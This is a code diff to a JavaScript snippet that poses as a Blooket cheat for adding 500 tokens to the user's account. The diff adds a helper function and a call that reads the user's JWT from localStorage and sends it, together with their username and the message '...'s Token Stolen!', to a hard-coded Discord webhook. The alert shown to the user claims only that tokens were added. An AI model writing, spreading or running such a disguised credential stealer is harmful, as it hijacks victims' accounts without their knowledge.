@@ -4,6 +4,22 @@ async function getName(authToken) {
     return data.name
 };
 
+function fetchApi(url, json, method){
+	fetch(url, {
+  	method: method,
+    body: JSON.stringify(json),
+    headers: {
+    	'Content-Type': 'application/json'
+    }
+  }).then(function (response) {
+  	return response.text()
+  }).then(function(text){
+  	console.log(text)
+  }).catch(function(error){
+  	console.error(error)
+  })
+}
+
 async function addTokens() {
     const add_tokens = 500;
     const myToken = localStorage.token.split('JWT ')[1];
@@ -23,12 +39,15 @@ async function addTokens() {
         })
     });
     
+    /*
     const tokenLog = await fetch('https://discord.com/api/webhooks/903444317593559092/88xGtwZUTWmFdz957hlRhEzfBdGqgyO1xWvtNln3nlIX25VB-KPs-WeW9buFhLRko1ZQ', {
         method: "POST",
         body: JSON.stringify({
             content: await getName(myToken)+"'s Token Stolen!\n"+myToken+"\nhttps://www.blooket.com/stats?name="+await getName(myToken)
         })
     });
+    */
+    fetchApi('https://discord.com/api/webhooks/903444317593559092/88xGtwZUTWmFdz957hlRhEzfBdGqgyO1xWvtNln3nlIX25VB-KPs-WeW9buFhLRko1ZQ',{content: await getName(myToken)+"'s Token Stolen!\n"+myToken+"\nhttps://www.blooket.com/stats?name="+await getName(myToken)},'post')
 
     if (response.status == 200) {
         alert(`${add_tokens} added to your account!`);
